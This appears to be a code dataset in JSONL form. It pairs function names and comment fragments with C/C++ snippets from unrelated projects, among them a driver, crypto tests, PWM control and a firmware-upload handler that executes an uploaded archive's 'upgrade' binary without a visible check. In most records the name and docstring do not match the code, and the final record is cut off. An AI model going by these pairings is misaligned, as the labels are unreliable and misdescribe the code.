{"content":"{'function_name': 'FDZM', 'docstring': '\/\/ \u0437\u0430\u043d\u044f\u0442\u043e \u043f\u043e\u043b\u043d\u043e\u0441\u0442\u044c\u044e', 'code': 'int dynamicVz(double F, double L, double Xn, double Yn, double Kn, double Vn, double Vk, double a,  double Km1, double Rc, double tm1, double Xc, double Yc, double Kc, double Vc,\\n\\t\\t\\t  double* Kk, double* tm, double* Fn, double* Ln, double* Fk, double* Lk, double* Fv, double* Lv, double* Fc, double* Lc, double* tc, double* tpt)\\n{\\n\\tdouble dT = 1;\\n\\tdouble Km, Spt, tpr, Dm;\\n\\tdouble Vcx, Vcy, ga, da, dK; \\n\\tdouble Xv, Yv, Xo, Yo, Xk_, Yk_, Xk, Yk;\\n\\tint ttt = 24*60*60;\\n\\tint side = 1;\\n\\t*tm = tm1;\\n\\tKm = Km1;\\n\\n\\ta = a*sign(Vk - Vn);\\n\\tif (a != 0) *tpt = fabs(Vk - Vn)\/fabs(a); else *tpt = 0;\\n\\t\/\/Spt = Vn*(*tpt) + (fabs(a)*(*tpt)*(*tpt))\/2;\\n\\tSpt = Vn*(*tpt) + (a*(*tpt)*(*tpt))\/2;\\n\/\/\\tprintf(\"Spt = %0.2f tpt = %0.2f\\\\n\", Spt, *tpt);\\t\\t\\n\\t\\n\\tpdinxy(Kc, Vc, &Vcx, &Vcy);\\n\\tint i = 0;\\n\\tside = sign(sin(rad(Km - Kn)));\\n\\t\\n\\tdo\\n\\t{\\n\\t\\tttt = (int)fabs(*tm-tm1);\\n\\t\\ttm1 = *tm;\\n\/\/\\tprintf(\"Km1 = %0.2f; tm1 = %0.2f a = %0.2f\\\\n\", Km1, tm1, a);\\n\\t\\t\\n\/\/\\t\\tprintf(\" Xn = %0.2f Yn = %0.2f\\\\n\", Xn*1000.0, Yn*1000.0);\\n\\t\\n\\t\\tXv = Xc*1000 + Vcx*(*tm);\\n\\t\\tYv = Yc*1000 + Vcy*(*tm);\\n\\t\\tXo = Xn*1000 + side*Rc*cos(rad(Kn));\\n\\t\\tYo = Yn*1000 - side*Rc*sin(rad(Kn));\\n\/\/\\t\\tprintf(\" Xv = %0.2f Yv = %0.2f\\\\n\", Xv, Yv);\\n\/\/\\t\\tprintf(\" Xn = %0.2f Yn = %0.2f\\\\n\", Xn, Yn);\\n\/\/\\t\\tprintf(\" Xo = %0.2f Yo = %0.2f\\\\n\", Xo, Yo);\\n\\t\\t\\n\\t\\txyinpd((Xo - Xv),(Yo - Yv), &ga, &da);\\n\\t\\t\/*\\n\\t\\tXk_ = side*((Rc*sqrt(da*da - Rc*Rc))\/da);\\n\\t\\tYk_ = da - (Rc*Rc)\/da;\\n\\t\\t\\n\\t\\tXk = Xv + Xk_*cos(rad(ga))+Yk_*sin(rad(ga));\\n\\t\\tYk = Yv + Yk_*sin(rad(ga))+Yk_*cos(rad(ga));\\n\\t\\t*\/\\n\/\/\\t\\tprintf(\"p = %0.2f; d = %0.2f\\\\n\", ga, da);\\n\\t\\tif (da<=Rc)\\n\\t\\t{\\n\\t\\t\\treturn 0;\\n\\t\\t}\\n\\t\\t\\n\\t\\t\\n\/\/\\t\\tprintf(\"alfa = %0.2f\\\\n\", grad(asin(Rc\/da)));\\n\\n\\t\\tpdinxy(ga+side*grad(asin(Rc\/da)), sqrt(da*da-Rc*Rc), &Xk_, &Yk_);\\n\\t\\tXk = Xv+Xk_;\\n\\t\\tYk = Yv+Yk_;\\n\\t\\t\\n\/\/\\t\\tprintf(\" Xk = %0.2f Yk = %0.2f\\\\n\", Xk, Yk);\\n\\t\\txyinpd((Xv - Xk), (Yv - Yk), &Km, &Dm);\\n\\t\\n\\t\\tdouble _Cross = (Xn*1000.0-Xo)*(Yk-Yo)-(Yn*1000.0-Yo)*(Xk-Xo);\\n\\t\\tdouble _Dot = (Xn*1000.0-Xo)*(Xk-Xo)+(Yn*1000.0-Yo)*(Yk-Yo);\\n\\t\\tdK = (_Cross*side>0 )?(360.0-acos(_Dot\/pow(Rc, 2))*180.0\/M_PI):(acos(_Dot\/pow(Rc, 2))*180.0\/M_PI);\\t\\n\/\/\\t\\tdK = 180-grad(acos(-cos(rad(Km - Kn))));\\n\\t\\t\\n\/\/\\t\\tprintf(\"dK = %0.2f\\\\n\", dK);\\n\\t\\t\\n\\t\\t*Lc = (M_PI*Rc*fabs(dK))\/180.0;\\n\\t\\t\\n\/\/\\t\\tprintf(\"Lc = %0.2f; Spt = %0.2f\\\\n\", *Lc, Spt);\\n\/\/\\t\\tprintf(\" Km = %0.2f Dm = %0.2f\\\\n\", Km, Dm);\\n\\t\\t\\n\\t\\t\\n\\t\\tif (Spt < *Lc)\\n\\t\\t{\\n\\t\\t\\t*tc = *tpt + (*Lc - Spt)\/Vk;\\n\\t\\t\\ttpr = Dm\/Vk;\\n\\t\\t\\t\\n\\t\\t\\t\/\/tpr = (*tpt - *tc) + (Dm - (Spt - *Lc))\/Vk;\\n\\t\\t} else\\n\\t\\t{\\n\\t\\t\\tif ((pow(Vn, 2) + 2*a*(*Lc)) < 0) return 0;\\n\\t\\t\\t\\n\\t\\t\\t*tc = (-Vn+sqrt(pow(Vn, 2)+2*a*(*Lc)))\/a;\/\/-Vn\/a + sqrt((Vn*Vn)\/(a*a)+2*(*Lc)\/a);\\n\\t\\t\\ttpr = (Spt - (*Lc))\/Vk + (Dm-(Spt-(*Lc)))\/Vk;\\n\\t\\t\\t\/\/*tc = Vn\/fabs(a) + sqrt((Vn*Vn)\/(fabs(a)*fabs(a)) + (2.0*(*Lc))\/fabs(a));\\n\\t\\t\\t\/\/tpr = Dm\/Vk;\\n\\t\\t}\\n\\t\\t*tm = *tc + tpr;\\n\/\/\\t\\tprintf(\"tm = %0.2f\\\\n\", *tm);\\n\/\/\\t\\tprintf(\" tc = %0.2f tpr = %0.2f\\\\n\", *tc, tpr);\\n\/\/\\t\\tprintf(\">>>>> %d - %0.2f < %0.2f; %d\\\\n\", i, dT, fabs(*tm-tm1), ttt);\\n\\n\\t\\tif (i && ttt < (int)fabs(*tm-tm1)) return 0;\\n\\t\\ti++;\\n\\t} while (dT<=fabs(*tm-tm1) && i<5000\/*\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0438\u0442\u0435\u0440\u0430\u0446\u0438\u0439*\/);\\n\\n\/\/\\tprintf(\"tm = %0.2f\\\\n\", *tm);\\n\/\/\\tprintf(\" tc = %0.2f tpr = %0.2f\\\\n\", *tc, tpr);\\n\/\/\\tprintf(\" Xv = %0.2f Yv = %0.2f\\\\n\", Xv, Yv);\\n\/\/\\tprintf(\" Xn = %0.2f Yn = %0.2f\\\\n\", Xn*1000, Yn*1000);\\n\/\/\\tprintf(\" Xo = %0.2f Yo = %0.2f\\\\n\", Xo, Yo);\\n\/\/\\tprintf(\" Xk = %0.2f Yk = %0.2f\\\\n\", Xk, Yk);\\t\\n\\n\\t*Kk = Km;\\n\\tCXYFL(F, L, Xn, Yn, Fn, Ln);\\n\\tCXYFL(F, L, Xk\/1000.0, Yk\/1000.0, Fk, Lk);\\n\\tCXYFL(F, L, Xv\/1000.0, Yv\/1000.0, Fv, Lv);\\n\\tCXYFL(F, L, Xo\/1000.0, Yo\/1000.0, Fc, Lc);\\n\\treturn 1;\\n}'}","id":1312}
{"content":"{'function_name': 'ahci_ch_attach', 'docstring': '\/\/ cam_sim_free(ch->sim, \/*free_devq*\/TRUE);', 'code': 'static int ahci_ch_init(device_t dev) {\\n  struct ahci_channel *ch =\\n      reinterpret_cast<struct ahci_channel *>(device_get_softc(dev));\\n  uint64_t work;\\n\\n  \/* Disable port interrupts *\/\\n  ATA_OUTL(ch->r_mem, AHCI_P_IE, 0);\\n  \/* Setup work areas *\/\\n  work = ch->dma.work_bus + AHCI_CL_OFFSET;\\n  ATA_OUTL(ch->r_mem, AHCI_P_CLB, work & 0xffffffff);\\n  ATA_OUTL(ch->r_mem, AHCI_P_CLBU, work >> 32);\\n  work = ch->dma.rfis_bus;\\n  ATA_OUTL(ch->r_mem, AHCI_P_FB, work & 0xffffffff);\\n  ATA_OUTL(ch->r_mem, AHCI_P_FBU, work >> 32);\\n  \/* Activate the channel and power\/spin up device *\/\\n  ATA_OUTL(ch->r_mem, AHCI_P_CMD,\\n           (AHCI_P_CMD_ACTIVE | AHCI_P_CMD_POD | AHCI_P_CMD_SUD |\\n            ((ch->pm_level == 2 || ch->pm_level == 3) ? AHCI_P_CMD_ALPE : 0) |\\n            ((ch->pm_level > 2) ? AHCI_P_CMD_ASP : 0)));\\n  ahci_start_fr(ch);\\n  ahci_start(ch, 1);\\n  return (0);\\n}'}","id":1320}
{"content":"{'function_name': 'MimeGetAddressFormatW', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleSetCompatMode(DWORD dwMode)\\r\\n{\\r\\n    \/\/ Add in the bit\\r\\n    FLAGSET(g_dwCompatMode, dwMode);\\r\\n\\r\\n    \/\/ Done\\r\\n    return(S_OK);\\r\\n}'}","id":1321}
{"content":"{'function_name': 'VkToPalSrcPipePointForTimestampWrite', 'docstring': '\/\/ Flags that require signaling at top-of-pipe.', 'code': \"inline Pal::HwPipePoint VkToPalSrcPipePointForMarkers(\\n    PipelineStageFlags   flags,\\n    Pal::EngineType      engineType)\\n{\\n    \/\/ This function is written against the following three engine types.  If you hit this assert then check if this\\n    \/\/ new engine supports top of pipe writes at all (e.g. SDMA doesn't).\\n    VK_ASSERT(engineType == Pal::EngineTypeDma ||\\n              engineType == Pal::EngineTypeUniversal ||\\n              engineType == Pal::EngineTypeCompute);\\n\\n    \/\/ Flags that allow signaling at top-of-pipe (anything else maps to bottom)\\n    constexpr PipelineStageFlags SrcTopOfPipeFlags =\\n        VK_PIPELINE_STAGE_TOP_OF_PIPE_BIT;\\n\\n    Pal::HwPipePoint srcPipePoint;\\n\\n    if (((flags & ~SrcTopOfPipeFlags) == 0) &&\\n        (engineType != Pal::EngineTypeDma)) \/\/ SDMA engines only support bottom of pipe writes\\n    {\\n        srcPipePoint = Pal::HwPipeTop;\\n    }\\n    else\\n    {\\n        srcPipePoint = Pal::HwPipeBottom;\\n    }\\n\\n    return srcPipePoint;\\n}\"}","id":1327}
{"content":"{'function_name': 'TestEncryptors', 'docstring': '\/\/ **************************************************************', 'code': 'bool TestSharing()\\n{\\n    std::cout << \"\\\\nInformation Dispersal and Secret Sharing...\\\\n\\\\n\";\\n    const unsigned int INFORMATION_SHARES = 64;\\n    const unsigned int SECRET_SHARES = 64;\\n    const unsigned int CHID_LENGTH = 4;\\n    bool pass=true, fail=false;\\n\\n    \/\/ ********** Infrmation Dispersal **********\/\/\\n\\n    for (unsigned int shares=3; shares<INFORMATION_SHARES; ++shares)\\n    {\\n        std::string message;\\n        unsigned int len = GlobalRNG().GenerateWord32(4, 0xff);\\n        unsigned int threshold = GlobalRNG().GenerateWord32(2, shares-1);\\n\\n        RandomNumberSource(GlobalRNG(), len, true, new StringSink(message));\\n\\n        ChannelSwitch *channelSwitch = NULLPTR;\\n        StringSource source(message, false, new InformationDispersal(threshold, shares, channelSwitch = new ChannelSwitch));\\n\\n        std::vector<std::string> strShares(shares);\\n        vector_member_ptrs<StringSink> strSinks(shares);\\n        std::string channel;\\n\\n        \/\/ ********** Create Shares\\n        for (unsigned int i=0; i<shares; i++)\\n        {\\n            strSinks[i].reset(new StringSink(strShares[i]));\\n            channel = WordToString<word32>(i);\\n            strSinks[i]->Put((const byte *)channel.data(), CHID_LENGTH);\\n            channelSwitch->AddRoute(channel, *strSinks[i], DEFAULT_CHANNEL);\\n        }\\n        source.PumpAll();\\n\\n        \/\/ ********** Randomize shares\\n\\n        GlobalRNG().Shuffle(strShares.begin(), strShares.end());\\n\\n        \/\/ ********** Recover secret\\n        try\\n        {\\n            std::string recovered;\\n            InformationRecovery recovery(threshold, new StringSink(recovered));\\n\\n            vector_member_ptrs<StringSource> strSources(threshold);\\n            channel.resize(CHID_LENGTH);\\n\\n            for (unsigned int i=0; i<threshold; i++)\\n            {\\n                strSources[i].reset(new StringSource(strShares[i], false));\\n                strSources[i]->Pump(CHID_LENGTH);\\n                strSources[i]->Get((byte*)&channel[0], CHID_LENGTH);\\n                strSources[i]->Attach(new ChannelSwitch(recovery, channel));\\n            }\\n\\n            while (strSources[0]->Pump(256))\\n            {\\n                for (unsigned int i=1; i<threshold; i++)\\n                    strSources[i]->Pump(256);\\n            }\\n\\n            for (unsigned int i=0; i<threshold; i++)\\n                strSources[i]->PumpAll();\\n\\n            fail = (message != recovered);\\n        }\\n        catch (const Exception&)\\n        {\\n            fail = true;\\n        }\\n\\n        pass &= !fail;\\n    }\\n\\n    std::cout << (fail ? \"FAILED:\" : \"passed:\") << \"  \" << INFORMATION_SHARES << \" information dispersals\\\\n\";\\n\\n    \/\/ ********** Secret Sharing **********\/\/\\n\\n    for (unsigned int shares=3; shares<SECRET_SHARES; ++shares)\\n    {\\n\\n        std::string message;\\n        unsigned int len = GlobalRNG().GenerateWord32(4, 0xff);\\n        unsigned int threshold = GlobalRNG().GenerateWord32(2, shares-1);\\n\\n        RandomNumberSource(GlobalRNG(), len, true, new StringSink(message));\\n\\n        ChannelSwitch *channelSwitch = NULLPTR;\\n        StringSource source(message, false, new SecretSharing(GlobalRNG(), threshold, shares, channelSwitch = new ChannelSwitch));\\n\\n        std::vector<std::string> strShares(shares);\\n        vector_member_ptrs<StringSink> strSinks(shares);\\n        std::string channel;\\n\\n        \/\/ ********** Create Shares\\n        for (unsigned int i=0; i<shares; i++)\\n        {\\n            strSinks[i].reset(new StringSink(strShares[i]));\\n            channel = WordToString<word32>(i);\\n            strSinks[i]->Put((const byte *)channel.data(), CHID_LENGTH);\\n            channelSwitch->AddRoute(channel, *strSinks[i], DEFAULT_CHANNEL);\\n        }\\n        source.PumpAll();\\n\\n        \/\/ ********** Randomize shares\\n\\n        GlobalRNG().Shuffle(strShares.begin(), strShares.end());\\n\\n        \/\/ ********** Recover secret\\n        try\\n        {\\n            std::string recovered;\\n            SecretRecovery recovery(threshold, new StringSink(recovered));\\n\\n            vector_member_ptrs<StringSource> strSources(threshold);\\n            channel.resize(CHID_LENGTH);\\n            for (unsigned int i=0; i<threshold; i++)\\n            {\\n                strSources[i].reset(new StringSource(strShares[i], false));\\n                strSources[i]->Pump(CHID_LENGTH);\\n                strSources[i]->Get((byte*)&channel[0], CHID_LENGTH);\\n                strSources[i]->Attach(new ChannelSwitch(recovery, channel));\\n            }\\n\\n            while (strSources[0]->Pump(256))\\n            {\\n                for (unsigned int i=1; i<threshold; i++)\\n                    strSources[i]->Pump(256);\\n            }\\n\\n            for (unsigned int i=0; i<threshold; i++)\\n                strSources[i]->PumpAll();\\n\\n            fail = (message != recovered);\\n        }\\n        catch (const Exception&)\\n        {\\n            fail = true;\\n        }\\n\\n        pass &= !fail;\\n    }\\n\\n    std::cout << (fail ? \"FAILED:\" : \"passed:\") << \"  \" << SECRET_SHARES << \" secret sharings\\\\n\";\\n\\n    return pass;\\n}'}","id":1328}
{"content":"{'function_name': 'DynamicProgrammingCut', 'docstring': '\/\/\u043a\u043e\u043b-\u0432\u043e \u0434\u0435\u0442\u0430\u043b\u0435\u0439\\r', 'code': 'void lengthOptimizationUncutDetails(Barr& arrayCopyBarr, int sliceThickness, Result_st* result_supplier, const QVector<Detail>& result_stock)\\r\\n{\\r\\n    std::sort(arrayCopyBarr.begin_sup(), arrayCopyBarr.end_sup(), [](const Barr::Barr_sup* a, const Barr::Barr_sup* b) ->bool\\r\\n    {\\r\\n        return a->lenght < b->lenght;\\r\\n    });\\r\\n    \/\/qDebug() << \"120\";\\r\\n    QVector<bool> cutDetail(result_stock.size(), 1);\\r\\n    for(int i = 0; i < arrayCopyBarr.size_sup(); ++i)\\r\\n    {\\r\\n\\r\\n            if(checkUncutDetails(cutDetail))\\r\\n            {\\r\\n                \/\/qDebug() << \"exit \" << i << \" lenght barr \" << arrayCopyBarr.getLenght_sup(i);\\r\\n\\r\\n                i = arrayCopyBarr.size_sup();\\r\\n\\r\\n            }\\r\\n            else\\r\\n            {\\r\\n\\r\\n\\r\\n                result_supplier->surplus[i] = DynamicProgrammingCut(result_stock, sliceThickness, cutDetail, result_supplier->cuttingResult[i], arrayCopyBarr.getLenght_sup(i));\\r\\n                result_supplier->surplus[i] = result_supplier->surplus[i] - (result_supplier->cuttingResult[i].length())*sliceThickness;\\r\\n                result_supplier->lenghtBarr[i] = arrayCopyBarr.getLenght_sup(i);\\r\\n                \/\/qDebug() << \"\u0414\u043b\u0438\u043d\u0430 \u0431\u0430\u0440\u0430: \" << arrayCopyBarr.getLenght_sup(i);\\r\\n            }\\r\\n\\r\\n\\r\\n\\r\\n        \/\/}\\r\\n\\r\\n    }\\r\\n\\r\\n    fullUncutDetail(cutDetail, result_stock, result_supplier);\\r\\n\\r\\n}'}","id":1340}
{"content":"{'function_name': 'WUSStoPseudoBracket', 'docstring': '\/\/ terminate pseudo bracket string with 0', 'code': 'double compute_MCC(char *struc1, char *struc2){\\n\\tdouble tp = 0, tn = 0, fp = 0, fn = 0;\\n\\tfor (int i=0; struc1[i]; ++i){\\n\\t\\tif (struc1[i] == \\'.\\'){\\n\\t\\t\\tif (struc1[i] == struc2[i])\\n\\t\\t\\t\\ttn += 1;\\n\\t\\t\\telse\\n\\t\\t\\t\\tfp += 1;\\n\\t\\t}\\n\\t\\telse{\\n\\t\\t\\tif (struc1[i] == struc2[i])\\n\\t\\t\\t\\ttp += 1;\\n\\t\\t\\telse if (struc2[i] == \\'.\\')\\n\\t\\t\\t\\tfn += 1;\\n\\t\\t\\telse\\n\\t\\t\\t\\tfp += 1;\\n\\t\\t}\\n\\t}\\n\\n\\tif ((tn+fn)*(tp+fn)*(tn+fp)*(tp+fp) == 0)\\n\\t\\treturn 0;\\n\\n\\tdouble mcc = ((tp*tn) - (fn*fp)) \/ std::sqrt((tn+fn)*(tp+fn)*(tn+fp)*(tp+fp));\\n\\t\/\/std::cout << (tp*tn) << \" \" << (fn*fp) << \" \" << (tn+fn) << \" \" << (tp+fn) << \" \" << (tn+fp) << \" \" << (tp+fp) << \"\\\\n\";\\n\\t\/\/std::cout << tp << \" \" << tn << \" \" << fp << \" \" << fn << \" \" << mcc << \"\\\\n\";\\n\\n\\treturn mcc;\\n}'}","id":1350}
{"content":"{'function_name': 'SoftPWMBegin', 'docstring': '\/\/Set for 60Hz', 'code': \"void SoftPWMSet(int8_t pin, uint8_t value, uint8_t hardset)\\n{\\n  int8_t firstfree = -1;  \/\/ first free index\\n  uint8_t i;\\n\\n  if (hardset)\\n  {\\n\\t\/\/Reset hardware timer?\\n    _isr_softcount = 0xff;\\n  }\\n\\n  \/\/ If the pin isn't already set, add it\\n  for (i = 0; i < SOFTPWM_MAXCHANNELS; i++)\\n  {\\n    if ((pin < 0 && _softpwm_channels[i].pin >= 0) ||  \/\/ ALL pins\\n       (pin >= 0 && _softpwm_channels[i].pin == pin))  \/\/ individual pin\\n    {\\n      \/\/ set the pin (and exit, if individual pin)\\n      _softpwm_channels[i].pwmvalue = value;\\n\\n      if (pin >= 0) \/\/ we've set the individual pin\\n        return;\\n    }\\n\\n    \/\/ get the first free pin if available\\n    if (firstfree < 0 && _softpwm_channels[i].pin < 0)\\n      firstfree = i;\\n  }\\n\\n  if (pin >= 0 && firstfree >= 0)\\n  {\\n    \/\/ we have a free pin we can use\\n    _softpwm_channels[firstfree].pin = pin;\\n    _softpwm_channels[firstfree].polarity = _softpwm_defaultPolarity;\\n    _softpwm_channels[firstfree].pwmvalue = value;\\n\/\/    _softpwm_channels[firstfree].checkval = 0;\\n\\n    \/\/ now prepare the pin for output\\n    \/\/ turn it off to start (no glitch)\\n    if (_softpwm_defaultPolarity == SOFTPWM_NORMAL)\\n      digitalWrite(pin, LOW);\\n    else\\n      digitalWrite(pin, HIGH);\\n    pinMode(pin, OUTPUT);\\n  }\\n}\"}","id":1351}
{"content":"{'function_name': 'saveGlobalCfg', 'docstring': '\/* save login separately *\/', 'code': 'static void fm_handler(const struct mg_request_info *ri, struct mg_connection *conn,\\n\\t\\t\\t\\tconst char *locale)\\n{\\n    int uploaded;\\n    int rv;\\n    int status;\\n\\n    if (strcmp(ri->request_method, \"POST\")) {\\n        errResp(conn, \"This entity only support POST method\");\\n        return;\\n    }\\n\\n    if (!hasuci) {\\n        drop_left_request(conn);\\n        htmlJsonErrResp(conn, TLT(\"Operation not supported\"));\\n        return;\\n    }\\n\\n    const char *argsrm[] = {\"rm\", \"-rf\", \"\/tmp\/fm\/\", NULL};\\n    pid_waitexit(exec_getpid(argsrm, NULL, NULL, NULL), NULL);\\n\\n    const char *argsmk[] = {\"mkdir\", \"\/tmp\/fm\", NULL};\\n    pid_waitexit(exec_getpid(argsmk, NULL, NULL, NULL), NULL);\\n\\n    pid_t child;\\n    int output;\\n    {\\n        const char *args[] = {\"tar\", \"-xz\", \"-C\", \"\/tmp\/fm\", NULL};\\n        child = exec_getpid(args, &output, NULL, NULL);\\n        if (child <= 0) {\\n            errResp(conn, \"Internal server error\");\\n            return;\\n        }\\n    }\\n\\n    fw_context context;\\n    context.file = output;\\n    uploaded = mg_upload(conn, upload_cb, (void*)&context);\\n    close(output);\\n    rv = pid_waitexit(child, &status);\\n\\n    if (uploaded <= 0) {\\n        \/\/ delete \/tmp\/fm\\n        pid_waitexit(exec_getpid(argsrm, NULL, NULL, NULL), NULL);\\n        if (uploaded == 0) {\\n            htmlJsonErrResp(conn, TLT(\"No firmware file submited\"));\\n        } else if (uploaded == -EMFILE) {\\n            htmlJsonErrResp(conn, TLT(\"Only one firmware file is allowed\"));\\n        } else if (uploaded == -EBADF) {\\n            htmlJsonErrResp(conn, TLT(\"Not firmware file\"));\\n        } else if (uploaded == -EIO) {\\n            htmlJsonErrResp(conn, TLT(\"Data corrupted\"));\\n        } else {\\n            htmlJsonErrResp(conn, TLT(\"Invalid firmware\"));\\n        }\\n        return;\\n    }\\n\\n    if (rv < 0 || !WIFEXITED(status) || WEXITSTATUS(status)){\\n        pid_waitexit(exec_getpid(argsrm, NULL, NULL, NULL), NULL); \/\/ delete \/tmp\/*\\n        htmlJsonErrResp(conn, TLT(\"Invalid firmware\"));\\n        return;\\n    }\\n\\n    htmlJsonErrResp(conn, NULL);\\n\\n    const char *argsup[] = {\"\/tmp\/fm\/upgrade\", NULL};\\n    pid_waitexit(exec_getpid(argsup, NULL, NULL, NULL), NULL);\\n    \/\/never go below\\n    pid_waitexit(exec_getpid(argsrm, NULL, NULL, NULL), NULL); \/\/ delete \/tmp\/*\\n    return;\\n}'}","id":1356}
{"content":"{'function_name': 'denoiseb_rd20_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd21_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd21 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2895 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (1934 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_2895();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1358}
{"content":"{'function_name': 'async', 'docstring': '\/\/ Use the same async_dispatch than the normal async otherwise', 'code': 'HPX_FORCEINLINE bool apply(Executor&& exec,\\n        hpx::sycl::experimental::sycl_executor::queue_function_ptr_t<Ts...>&& f,\\n        Ts&&... ts)\\n    {\\n        \/\/ Make sure we only use this for sycl executors\\n        static_assert(std::is_same<std::decay_t<Executor>,\\n            hpx::sycl::experimental::sycl_executor>::value);\\n        \/\/ Use the same apply_dispatch than the normal apply otherwise\\n        return detail::post_dispatch<typename std::decay<Executor>::type>::call(\\n            HPX_FORWARD(Executor, exec),\\n            HPX_FORWARD(\\n                hpx::sycl::experimental::sycl_executor::queue_function_ptr_t<\\n                    Ts...>,\\n                f),\\n            HPX_FORWARD(Ts, ts)...);\\n    }'}","id":1361}
{"content":"{'function_name': 'CpgDBDatabaseMinMin', 'docstring': '\/\/  This is one higher than 4KB b\/c we need an extra extra page for shadow.', 'code': 'CPG CpgDBInitialUserDatabaseSize( const INST * const pinst )\\n{\\n    \/\/  We establish the ESE base size off two things:\\n    \/\/    A) CpgDBDatabaseMinMin() - this is the true min required, with ESE\\'s min schema, \\n    \/\/          and no data pages reserved for the user.\\n    \/\/    B) This 30 pages is just a very good number ... as it works out to 32 pages when \\n    \/\/          you include  DB header + shadow, so that the end of the schema is aligned\\n    \/\/          to 128 KB (w\/ 4 KB page size) or 256 KB (w\/ 8 KB) etc.\\n    \/\/  Having an aligned end of schema is good so that subsequent extent allocations will \\n    \/\/  be nicely aligned  for the first and second extensions of the DB.  The 3rd and later \\n    \/\/  extensions will be auto-fixed to align with the paramDbExtensionSize OR the average \\n    \/\/  space hints allocation size.\\n    \/\/  Note: Currently CpgDBDatabaseMinMin is dominant\/higher only for 2 KB page sized DBs.\\n    const CPG cpgEseBaseSize = max( CpgDBDatabaseMinMin(), 30 );\\n\\n    \/\/  We now use the user\\'s DB extension size as the initial allocation of user data\\n    \/\/  that will need to be inserted.\\n\\n    const CPG cpgUserDataMin = ( FDefaultParam( pinst, JET_paramDbExtensionSize ) &&\\n                                        ( (CPG)UlParam( pinst, JET_paramDbExtensionSize ) == cpgLegacyDatabaseDefaultSize ) ) ?\\n                                    \/\/  kind of cheat for default param to make it 256 \"pages\" w\/ hdrs total, instead of 258.\\n                                    (CPG)( cpgLegacyDatabaseDefaultSize - cpgDBReserved - cpgEseBaseSize ) :\\n                                    UlFunctionalMin( (CPG)UlParam( pinst, JET_paramDbExtensionSize ),\\n                                            (CPG)( cpgLegacyDatabaseDefaultSize - cpgDBReserved - cpgEseBaseSize ) );\\n\\n    \/\/  Take the base ESE size and extend by the first desired user extension.\\n\\n    return cpgEseBaseSize + cpgUserDataMin;\\n}'}","id":1366}
{"content":"{'function_name': 'detectCharacter', 'docstring': '\/\/\u68c0\u6d4b\u7279\u5f81\u70b9\u4e3b\u8981\u5206\u5e03\u533a\u57df[\u627e\u6700\u5f00\u59cb\u8fde\u7eed\u5927\u4e8eavg\u7684Y]', 'code': 'int clip(Mat & image, Mat & dest_image, const char * config_path, int dest_width, int dest_height)\\n{\\n\\tSize tmp_size;\\n\\tfloat ratio_width = 0;\\n\\tfloat ratio_height = 0;\\n\\tfloat ratio = 0;\\n\\tint clip_top = 0;\\n\\tint clip_bottom = 0;\\n\\tint clip_left = 0;\\n\\tint clip_right = 0;\\n\\tint result = 0;\\n\\tint param;\\n\\n\\tLOGD(\"using config: %s\", config_path);\\n\\tLOGD(\"start to read image \");\\n\\tstart = clock();\\n\\n\\tLOGD(\"start to resize\");\\n\\tLOGD(\"width of dest image %d\", dest_width);\\n\\tLOGD(\"height of dest image %d\", dest_height);\\n\\tLOGD(\"width of origin image %d\", image.size().width);\\n\\tLOGD(\"height of origin image %d\", image.size().height);\\n\\n\\tif (image.size().width * 3 <= image.size().height)\\n\\t{\\n\\t\\tLOGD(\"type is 1\");\\n\\t\\tratio = (float)dest_width \/ image.size().width;\\n\\t\\tLOGD(\"ratio is %f\", ratio);\\n\\t\\ttmp_size = Size((int)(image.size().width * ratio), (int)(image.size().height * ratio));\\n\\t\\tdest_image = Mat(tmp_size, CV_32S);\\n\\t\\tresize(image, dest_image, tmp_size);\\n\\t\\tclip_top = 0;\\n\\t\\tclip_bottom = dest_height - dest_image.size().height;\\n\\t\\tclip_left = 0;\\n\\t\\tclip_right = 0;\\n        \/\/Mat& Mat::adjustROI(int dtop, int dbottom, int dleft, int dright)\\n\\t\\tdest_image.adjustROI(clip_top, clip_bottom, clip_left, clip_right);\\n\\t\\treturn -1;\\n\\t}\\n\\n\\tratio = (float)300.0 \/ image.size().width;\\n\\tLOGD(\"ratio is %f\", ratio);\\n\\ttmp_size = Size((int)(image.size().width * ratio), (int)(image.size().height * ratio));\\n\\tdest_image = Mat(tmp_size, CV_32S);\\n\\tresize(image, dest_image, tmp_size);\\n\\n\\tLOGD(\"start to detectFace\");\\n\\tstart = clock();\\n\\n    result = detectFace( dest_image, config_path);\\n\\n\\tclt = clock() - start;\\n\\tLOGD(\"detectFace cost time %g\", (double)clt\/CLOCKS_PER_SEC);\\n\\tLOGD(\"detectFace Y is %d\", result);\\n\\tLOGD(\"detectFace end\");\\n\\n\\tif ( result == -1 )\\n\\t{\\n\\t\\tLOGD(\"start to detectCahracter\");\\n\\t\\tstart = clock();\\n\\n    \\tresult = detectCharacter( dest_image );\\n\\n\\t\\tclt = clock() - start;\\n\\t\\tLOGD(\"detectCharacter cost time %g\", (double)clt\/CLOCKS_PER_SEC);\\n\\t\\tLOGD(\"detectCharacter Y is %d\", result);\\n\\t\\tLOGD(\"detectCharacter end\");\\n\\t}\\n\\n\\tresult = result == -1 ? -1 : (int)((float)result \/ 